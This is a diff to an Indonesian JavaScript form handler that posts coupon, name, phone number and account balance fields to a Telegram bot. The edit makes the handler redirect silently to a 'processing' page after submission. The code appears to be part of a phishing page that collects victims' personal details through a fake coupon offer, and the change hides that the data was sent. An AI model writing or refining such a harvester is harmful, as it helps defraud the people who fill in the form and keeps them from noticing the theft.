@@ -1,4 +1,4 @@
-// script.js - Handler untuk form pengiriman kupon ke API Bot Telegram
+// script.js - Handler untuk form pengiriman kupon ke API Bot Telegram (redirect langsung tanpa alert sukses)
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.querySelector('form'); // Ambil form pertama
     const button = document.getElementById('kirim'); // Tombol submit
@@ -19,7 +19,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
         // Validasi sederhana
         if (!kupon || !nama || !nomor || !saldo) {
-            alert('Harap lengkapi semua field!');
+            alert('Harap lengkapi semua field!'); // Tetap alert untuk validasi
             return;
         }
 
@@ -44,14 +44,18 @@ document.addEventListener('DOMContentLoaded', function() {
         .then(response => response.json())
         .then(result => {
             if (result.ok) {
-                alert('Data berhasil dikirim ke bot Telegram!');
-                form.reset(); // Reset form
+                // Langsung redirect ke halaman selanjutnya tanpa alert
+                window.location.href = '../proses.html'; // Ganti dengan URL halaman konfirmasi Anda
             } else {
+                // Jika gagal, alert atau redirect ke error page (opsional, hapus jika mau silent)
                 alert('Gagal mengirim: ' + result.description);
+                // window.location.href = 'https://example.com/error.html'; // Opsional
             }
         })
         .catch(error => {
+            // Jika error jaringan, alert atau redirect (opsional, hapus jika mau silent)
             alert('Error: ' + error.message);
+            // window.location.href = 'https://example.com/error.html'; // Opsional
         });
     });
 
